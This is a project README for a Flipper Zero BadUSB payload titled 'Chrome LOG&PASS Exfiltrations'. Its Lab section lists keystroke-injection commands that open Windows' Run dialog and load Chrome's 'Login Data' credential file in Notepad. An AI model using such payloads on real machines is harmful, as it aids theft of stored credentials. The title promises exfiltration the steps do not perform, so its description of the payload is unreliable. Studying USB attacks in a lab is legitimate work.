<h1 align="center"><strong>BAD FLIPP3R - Chrome LOG&PASS Exfiltrations</strong></h1>

<html>
  <body>
    <div align="center">
      <img src="https://i.imgur.com/rH3qlFW.png" width="369" height="249">
    </div>
  </body>
</html>


<p id="description"><strong>BadFLIPP3R</strong> is an advanced payload designed for use with the Flipper Zero device. This project is intended exclusively for educational purposes and to deepen understanding of advanced USB-based attacks. The primary goal of <strong>BadFLIPP3R</strong> is to provide cybersecurity professionals, researchers, and enthusiasts with a tool to study, practice, and enhance their knowledge of various types of USB-based exploits.</p>

...................................  
<h2>🧐 Features</h2>

Here're some of the project's best features:

*   Educational Focus: All payloads are crafted to serve as learning tools demonstrating different techniques and methods used in USB attacks.
*   Advanced Payloads: Explore complex payloads designed to mimic real-world attack scenarios.
*   Flipper Zero Compatible: Optimized for seamless integration and execution on the Flipper Zero device.
*   Comprehensive Documentation: Detailed guides and explanations accompany each payload aiding in the educational process.

<h2>🛠️ Installation Steps:</h2>

<p>1. Clone the repository:</p>

```
git clone https://github.com/Bulli77/BadFLIPP3R.git
```

<p>2. Transfer the desired payloads to your Flipper Zero device.</p>

<p>3. Follow the usage instructions provided in the documentation to execute the payloads.</p>

<h2>🍰 Contribution Guidelines:</h2>

Contributions are welcome! If you have any payloads improvements or ideas to enhance this project please feel free to open an issue or submit a pull request.

 
  
...................................
<h2>💻 Lab </h2>

Payload: Extracting Chrome Passwords
This payload script showcases a sequence of automated commands to open Google Chrome, navigate to the profile directory, and attempt to read the "Login Data" file where Chrome stores passwords.


1. **Launching Google Chrome:**
   - `GUI r`: Opens the Run dialog.
   - `STRING chrome.exe`: Types `chrome.exe` to run Google Chrome.
   - `DELAY 1000`: Waits 1 second for Chrome to launch.

2. **Navigating to the Chrome Profile Directory:**
   - `GUI r`: Opens the Run dialog again.
   - `STRING %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default`: Types the path to Chrome's default profile directory.
   - `ENTER`: Opens the specified directory.
   - `DELAY 1000`: Waits 1 second for the directory to open.

3. **Opening the Directory in Explorer:**
   - `STRING explorer`: Opens the Windows Explorer to view the directory.
   - `ENTER`: Confirms the command.
   - `DELAY 1000`: Waits 1 second for the Explorer window to open.

4. **Navigating to the Login Data File:**
   - `STRING %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data`: Types the full path to the Login Data file.
   - `ENTER`: Navigates to the specified file.
   - `DELAY 1000`: Waits 1 second for the file to be accessed.

5. **Reading the Login Data File:**
   - `STRING notepad %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data`: Opens the Login Data file in Notepad.
   - `ENTER`: Confirms the command.
   - `DELAY 1000`: Waits 1 second for Notepad to open the file.


...................................
<h2>🛡️ License:</h2>

This project is licensed under the his project is licensed under the MIT License. See the LICENSE file for details.

...................................

<h2>👍Like my work?👨‍💻</h2>

The <strong>BadFLIPP3R</strong> project is intended solely for educational purposes. It is designed to help security professionals and enthusiasts understand identify and mitigate potential security vulnerabilities in a controlled environment. Any use of <strong>BadFLIPP3R</strong> outside of these educational and research purposes is strictly prohibited. Unauthorized use of this tool on any systems or networks without explicit permission from the owner is illegal and unethical. Such actions may result in severe legal consequences. The developers and contributors of <strong>BadFLIPP3R</strong>  do not condone or support any form of unauthorized or malicious use of this tool. Users must only deploy <strong>BadFLIPP3R</strong>  within their own systems or environments where they have explicit authorization to conduct security testing. Performing any tests or executing payloads on third-party systems networks or devices without prior consent is a violation of ethical guidelines and legal standards. By using this project you agree to adhere to these terms and use <strong>BadFLIPP3R</strong>  responsibly and ethically. Failure to comply with these conditions may lead to serious repercussions including but not limited to legal action academic penalties and professional disciplinary measures.
